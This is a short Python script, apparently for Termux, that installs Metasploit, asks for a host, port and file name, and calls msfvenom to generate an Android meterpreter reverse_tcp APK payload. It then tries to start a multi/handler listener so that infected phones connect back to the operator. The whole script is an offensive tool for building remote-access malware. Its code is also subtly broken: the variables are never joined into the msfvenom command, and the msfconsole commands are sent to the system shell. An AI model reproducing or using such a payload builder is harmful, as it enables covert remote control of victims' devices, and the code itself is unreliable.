from os import *
#################
#y \033[0;33m
#r \033[0;31m
#g \033[0;32m
#b \033[0;34m
#################
system ("pkg install metasploit")
system ("clear")
#################
print ("\033[0;32m                   _                 _")
print ("\033[0;33m _ __   __ _ _   _| | ___   __ _  __| |")
print ("\033[0;32m| '_ \ / _` | | | | |/ _ \ / _` |/ _` |")
print ("\033[0;32m| |_) | (_| | |_| | | (_) | (_| | (_| |")
print ("\033[0;32m| .__/ \__,_|\__, |_|\___/ \__,_|\__,_|")
print ("\033[0;32m|_|          |___/")
print ("_________________________________________________")
print ("👉👉👉\033[0;31m>>>this tool was made with our team<<<👈👈👈")
print ("_________________________________________________")
#################
print (" ")
print (" ")
ip =input ("\033[0;32mset host/ip:>>>")
system ("sleep 0.3")
port =input ("\033[0;32mset port:>>>")
system ("sleep 0.3")
name =input ("\033[0;32mset payload name:>>>")
system ("sleep 0.3")
system ("	msfvenom -p android/meterpreter/reverse_tcp LHOST= + ip +  LPORT= + port + -o /sdcard/ + name + .apk")
system ("sleep 0.3")
print (" done ")
system ("use exploit/multi/handler")
system ("set payload android/meterpreter/reverse_tcp")
system ("set LHOST" + ip )
system ("set LPORT" + port )
system ("exploit")
